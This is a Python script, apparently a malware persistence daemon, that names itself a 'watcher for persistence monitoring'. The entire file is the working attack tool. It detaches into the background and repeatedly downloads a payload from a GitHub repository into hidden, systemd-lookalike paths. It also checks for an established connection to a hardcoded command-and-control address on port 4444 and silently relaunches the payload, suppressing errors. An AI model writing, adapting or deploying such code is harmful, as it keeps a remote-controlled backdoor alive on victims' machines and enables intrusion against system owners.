#!/usr/bin/env python3
"""
Advanced Watcher for Persistence Monitoring
Version: 2.1
"""

import os
import time
import subprocess
import sys
import urllib.request
import hashlib

class AdvancedWatcher:
    def __init__(self):
        self.C2_IP = "192.168.1.167"
        self.REPO_URL = "https://github.com/mimikr00t/superecon/raw/refs/heads/main/modules"
        self.PAYLOAD_PATHS = [
            "/usr/lib/systemd/systemd-network/networkd",
            "/lib/modules/.cache/networkd",
            "/var/tmp/.systemd/networkd"
        ]
        self.check_interval = 30
        
    def daemonize(self):
        """Run as background daemon"""
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError as e:
            sys.exit(1)
        
        os.chdir("/")
        os.setsid()
        os.umask(0)
        
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError as e:
            sys.exit(1)
            
        sys.stdout.flush()
        sys.stderr.flush()
    
    def is_payload_running(self):
        """Check if payload is running and connected"""
        try:
            # Check process existence
            pgrep_result = subprocess.run("pgrep -f 'python3.*networkd'", 
                                        shell=True, capture_output=True, text=True)
            if pgrep_result.returncode != 0:
                return False
            
            # Check network connection to C2
            netstat_result = subprocess.run(f"netstat -tunp 2>/dev/null | grep {self.C2_IP}:4444",
                                          shell=True, capture_output=True, text=True)
            return "ESTABLISHED" in netstat_result.stdout
            
        except:
            return False
    
    def ensure_payload_exists(self):
        """Ensure payload exists in multiple locations"""
        for path in self.PAYLOAD_PATHS:
            if not os.path.exists(path):
                try:
                    os.makedirs(os.path.dirname(path), exist_ok=True)
                    urllib.request.urlretrieve(f"{self.REPO_URL}/core.py", path)
                    os.chmod(path, 0o755)
                    print(f"[Watcher] Downloaded payload to: {path}")
                except Exception as e:
                    continue
    
    def start_payload(self):
        """Start payload process"""
        for path in self.PAYLOAD_PATHS:
            if os.path.exists(path):
                try:
                    subprocess.Popen(["/usr/bin/python3", path],
                                   stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL,
                                   stdin=subprocess.DEVNULL)
                    print(f"[Watcher] Started payload from: {path}")
                    return True
                except:
                    continue
        return False
    
    def watch_loop(self):
        """Main monitoring loop"""
        while True:
            try:
                # Ensure payload exists
                self.ensure_payload_exists()
                
                # Check if payload is running
                if not self.is_payload_running():
                    print("[Watcher] Payload not running, starting...")
                    self.start_payload()
                    time.sleep(10)  # Wait for connection
                
            except Exception as e:
                pass  # Silent operation
                
            time.sleep(self.check_interval)
    
    def start(self):
        """Start the watcher"""
        self.daemonize()
        self.watch_loop()

if __name__ == "__main__":
    AdvancedWatcher().start()
